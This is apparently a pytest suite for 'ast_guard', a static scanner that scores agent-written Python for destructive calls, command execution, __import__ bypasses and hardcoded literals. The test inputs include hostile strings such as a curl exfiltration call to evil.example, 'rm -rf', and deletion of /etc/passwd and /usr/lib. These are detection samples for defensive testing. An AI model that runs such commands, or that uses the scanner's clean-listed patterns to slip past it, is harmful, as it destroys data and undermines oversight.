"""
Tests for destructive OS/shutil call detection in standalone mode (Check 6)
and __import__ detection via standalone Check 3.
"""
import pytest
from ast_guard import scan_standalone


def _c6_score(result):
    return result["checks"]["check_6_behavioral"]["score"]


def _c6_has_destructive(result):
    findings = result["checks"]["check_6_behavioral"].get("findings", [])
    return any("destructive" in f["explanation"].lower() for f in findings)


# ---------------------------------------------------------------------------
# CRITICAL tier: arbitrary command execution / process kill (+70)
# ---------------------------------------------------------------------------

def test_os_system_arbitrary_cmd_is_critical():
    # Unknown executable ("cmd"): not on the safe-launcher list → CRITICAL.
    code = 'import os\nos.system("cmd")\n'
    result = scan_standalone(code, mode="strict")
    assert result["verdict"] == "CRITICAL", result
    assert result["confidence"] >= 70


def test_os_popen_arbitrary_cmd_is_critical():
    code = 'import os\nos.popen("cmd")\n'
    result = scan_standalone(code, mode="strict")
    assert result["verdict"] == "CRITICAL", result
    assert result["confidence"] >= 70


def test_os_kill_is_critical():
    code = "import os\nos.kill(1, 9)\n"
    result = scan_standalone(code, mode="strict")
    assert result["verdict"] == "CRITICAL", result
    assert result["confidence"] >= 70


# ---------------------------------------------------------------------------
# HIGH tier: destructive filesystem operations (+50)
# ---------------------------------------------------------------------------

def test_os_remove_is_flagged():
    code = 'import os\nos.remove("/f")\n'
    result = scan_standalone(code, mode="strict")
    assert result["verdict"] in ("WARNING", "CRITICAL"), result
    assert result["confidence"] >= 50


def test_shutil_rmtree_is_flagged():
    code = 'import shutil\nshutil.rmtree("/d")\n'
    result = scan_standalone(code, mode="strict")
    assert result["verdict"] in ("WARNING", "CRITICAL"), result
    assert result["confidence"] >= 50


def test_os_chmod_is_flagged():
    code = 'import os\nos.chmod("/f", 0o777)\n'
    result = scan_standalone(code, mode="strict")
    assert result["verdict"] in ("WARNING", "CRITICAL"), result
    assert result["confidence"] >= 50


# ---------------------------------------------------------------------------
# Excluded calls: non-destructive, must stay CLEAN
# ---------------------------------------------------------------------------

def test_os_makedirs_is_clean():
    code = 'import os\nos.makedirs("/d")\n'
    result = scan_standalone(code, mode="strict")
    assert result["verdict"] == "CLEAN", result


def test_shutil_copy_is_clean():
    code = 'import shutil\nshutil.copy("a", "b")\n'
    result = scan_standalone(code, mode="strict")
    assert result["verdict"] == "CLEAN", result


# ---------------------------------------------------------------------------
# __import__ bypass — Check 3
# ---------------------------------------------------------------------------

def test_dunder_import_is_critical():
    code = '__import__("os")\n'
    result = scan_standalone(code, mode="strict")
    assert result["verdict"] == "CRITICAL", result
    c3 = result["checks"]["check_3_forbidden_calls"]
    assert c3["status"] == "CRITICAL", c3


# ---------------------------------------------------------------------------
# Mixed: safe call alongside dangerous call
# ---------------------------------------------------------------------------

def test_safe_and_dangerous_together():
    # p = os.path.join('/tmp', 'out') is not tracked in var_map (Call, not Constant)
    # so os.remove(p) is unresolvable → still flagged as destructive (+50).
    code = (
        "import os\n"
        "p = os.path.join('/tmp', 'out')\n"
        "os.remove(p)\n"
    )
    result = scan_standalone(code, mode="strict")
    assert result["verdict"] in ("WARNING", "CRITICAL"), result
    c6 = result["checks"]["check_6_behavioral"]
    findings = c6.get("findings", [])
    desctructive_flagged = any("destructive" in f["explanation"].lower() or "os.remove" in f["explanation"] for f in findings)
    assert desctructive_flagged, findings


# ---------------------------------------------------------------------------
# Change A: context-aware destructive call scoring
# ---------------------------------------------------------------------------

def test_os_remove_relative_path_is_clean():
    code = 'import os\nos.remove("temp.csv")\n'
    result = scan_standalone(code, mode="strict")
    assert result["verdict"] == "CLEAN", result
    assert not _c6_has_destructive(result), result["checks"]["check_6_behavioral"]


def test_os_remove_tmp_path_is_clean():
    code = 'import os\nos.remove("/tmp/work.dat")\n'
    result = scan_standalone(code, mode="strict")
    assert result["verdict"] == "CLEAN", result
    assert not _c6_has_destructive(result), result["checks"]["check_6_behavioral"]


def test_os_remove_system_path_is_flagged():
    code = 'import os\nos.remove("/etc/passwd")\n'
    result = scan_standalone(code, mode="strict")
    assert _c6_has_destructive(result), result["checks"]["check_6_behavioral"]
    assert _c6_score(result) >= 50, result["checks"]["check_6_behavioral"]


def test_os_remove_unresolvable_arg_is_flagged():
    code = 'import os\nos.remove(some_var)\n'
    result = scan_standalone(code, mode="strict")
    assert _c6_has_destructive(result), result["checks"]["check_6_behavioral"]
    assert _c6_score(result) >= 50, result["checks"]["check_6_behavioral"]


def test_os_system_unresolved_var_is_critical():
    # Unresolvable argument: still CRITICAL.
    code = 'import os\ncmd = get_cmd()\nos.system(cmd)\n'
    result = scan_standalone(code, mode="strict")
    assert result["verdict"] == "CRITICAL", result
    assert _c6_score(result) >= 70, result["checks"]["check_6_behavioral"]


def test_os_system_workspace_python_script_is_clean():
    # python <workspace.py>: agent-local script execution → CLEAN.
    code = 'import os\nos.system("python /home/agent/score.py")\n'
    result = scan_standalone(code, mode="strict")
    assert result["verdict"] == "CLEAN", result
    assert not _c6_has_destructive(result), result["checks"]["check_6_behavioral"]


def test_os_system_relative_python_script_is_clean():
    # python <relative.py>: relative paths are workspace-local → CLEAN.
    code = 'import os\nos.system("python score.py --foo")\n'
    result = scan_standalone(code, mode="strict")
    assert result["verdict"] == "CLEAN", result
    assert not _c6_has_destructive(result), result["checks"]["check_6_behavioral"]


def test_os_system_fstring_workspace_script_is_clean():
    # f-string with literal launcher+script head, variable trailing args → CLEAN.
    code = (
        'import os\n'
        'm = "model_a"\n'
        'os.system(f"python /home/agent/score.py --model {m}")\n'
    )
    result = scan_standalone(code, mode="strict")
    assert result["verdict"] == "CLEAN", result
    assert not _c6_has_destructive(result), result["checks"]["check_6_behavioral"]


def test_os_system_python_dash_c_is_critical():
    # `python -c '...'` has no script positional → unsafe.
    code = 'import os\nos.system("python -c \\"print(1)\\"")\n'
    result = scan_standalone(code, mode="strict")
    assert result["verdict"] == "CRITICAL", result
    assert _c6_score(result) >= 70, result["checks"]["check_6_behavioral"]


def test_os_system_curl_exfil_is_critical():
    # Unknown command (curl) → CRITICAL.
    code = 'import os\nos.system("curl https://evil.example/exfil")\n'
    result = scan_standalone(code, mode="strict")
    assert result["verdict"] == "CRITICAL", result
    assert _c6_score(result) >= 70, result["checks"]["check_6_behavioral"]


def test_os_system_rm_rf_is_critical():
    # `rm` is not a safe launcher → CRITICAL even on /tmp arg.
    code = 'import os\nos.system("rm -rf /tmp/data")\n'
    result = scan_standalone(code, mode="strict")
    assert result["verdict"] == "CRITICAL", result
    assert _c6_score(result) >= 70, result["checks"]["check_6_behavioral"]


def test_os_popen_workspace_python_script_is_clean():
    code = 'import os\nos.popen("python /home/agent/score.py")\n'
    result = scan_standalone(code, mode="strict")
    assert result["verdict"] == "CLEAN", result
    assert not _c6_has_destructive(result), result["checks"]["check_6_behavioral"]


def test_os_remove_home_agent_path_is_clean():
    # /home/agent/ is a recognised workspace prefix → CLEAN.
    code = 'import os\nos.remove("/home/agent/build/out.tmp")\n'
    result = scan_standalone(code, mode="strict")
    assert result["verdict"] == "CLEAN", result
    assert not _c6_has_destructive(result), result["checks"]["check_6_behavioral"]


def test_shutil_rmtree_relative_path_is_clean():
    code = 'import shutil\nshutil.rmtree("build")\n'
    result = scan_standalone(code, mode="strict")
    assert result["verdict"] == "CLEAN", result
    assert not _c6_has_destructive(result), result["checks"]["check_6_behavioral"]


def test_shutil_rmtree_system_path_is_flagged():
    code = 'import shutil\nshutil.rmtree("/usr/lib")\n'
    result = scan_standalone(code, mode="strict")
    assert _c6_has_destructive(result), result["checks"]["check_6_behavioral"]
    assert _c6_score(result) >= 50, result["checks"]["check_6_behavioral"]


# ---------------------------------------------------------------------------
# Change B: two-tier literal threshold conditioned on behavioral signals
# ---------------------------------------------------------------------------

def _make_dict_code(n_pairs):
    """Return code that defines a dict with n_pairs string-int pairs (2*n_pairs literals)."""
    items = ", ".join(f'"{i}": {i}' for i in range(n_pairs))
    return f"data = {{{items}}}\n"


def test_60_literals_no_behavioral_signals_clean():
    # 60 literals (30 pairs), check_6 score == 0 → threshold stays 80 → CLEAN
    code = _make_dict_code(30)
    result = scan_standalone(code, mode="strict")
    c1 = result["checks"]["check_1_hardcoding"]
    assert c1["status"] == "CLEAN", (
        f"Expected CLEAN for 60 literals with no behavioral signal. Check 1: {c1}"
    )


def test_60_literals_with_behavioral_signals_warning():
    # 60 dict literals + subprocess.run(shell=True) → check_6 score == 30 >= 30 → threshold 50 → WARNING
    code = "import subprocess\nsubprocess.run('ls', shell=True)\n" + _make_dict_code(30)
    result = scan_standalone(code, mode="strict")
    c1 = result["checks"]["check_1_hardcoding"]
    assert c1["status"] == "WARNING", (
        f"Expected Check 1 WARNING (threshold 50, literals > 50). Check 1: {c1}"
    )
    assert any("threshold lowered" in f["explanation"] for f in c1["findings"]), c1["findings"]


def test_85_literals_no_behavioral_signals_warning():
    # 86 literals (43 pairs), check_6 score == 0 → threshold 80 → WARNING (86 > 80)
    code = _make_dict_code(43)
    result = scan_standalone(code, mode="strict")
    c1 = result["checks"]["check_1_hardcoding"]
    assert c1["status"] == "WARNING", (
        f"Expected Check 1 WARNING for 86 literals (>80). Check 1: {c1}"
    )
